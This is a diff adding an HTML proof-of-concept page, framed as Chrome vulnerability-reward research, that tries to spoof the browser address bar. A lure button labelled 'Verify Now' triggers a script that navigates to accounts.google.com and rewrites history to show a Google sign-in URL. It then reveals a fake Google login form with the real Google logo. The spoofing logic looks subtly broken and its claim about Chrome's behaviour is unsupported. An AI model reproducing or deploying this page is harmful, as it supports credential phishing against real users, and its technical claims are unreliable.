@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Chrome VRP Research</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: -apple-system, sans-serif; text-align: center; padding: 50px 20px; }
+        .btn { background: #1a73e8; color: white; padding: 15px 30px; border-radius: 4px; border: none; font-size: 16px; }
+        .fake-login { display: none; margin-top: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <h2>Check for Updates</h2>
+    <p>Tap below to verify your account security.</p>
+    <button class="btn" onclick="startSpoof()">Verify Now</button>
+
+    <div id="fakeUI" class="fake-login">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
+        <h3>Sign In</h3>
+        <input type="email" placeholder="Email or phone">
+        <input type="password" placeholder="Password">
+        <button class="btn">Login</button>
+    </div>
+
+    <script>
+        function startSpoof() {
+            // 1. Create a large blob to slow down the rendering process
+            const largeData = new Array(1000000).join('A');
+            const blob = new Blob([largeData], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+
+            // 2. Trigger a navigation to a high-value target
+            // In 2026, Chrome often commits the URL before the document is fully swapped
+            window.location.href = "https://accounts.google.com/#" + url;
+
+            // 3. Immediately manipulate history to lock the URL bar
+            setTimeout(() => {
+                history.pushState({}, "", "https://accounts.google.com/signin/v2/identifier");
+                
+                // 4. Reveal the fake UI on the current 'attacker' page
+                document.body.innerHTML = document.getElementById('fakeUI').innerHTML;
+                document.body.style.background = "white";
+            }, 50);
+        }
+    </script>
+</body>
+</html>
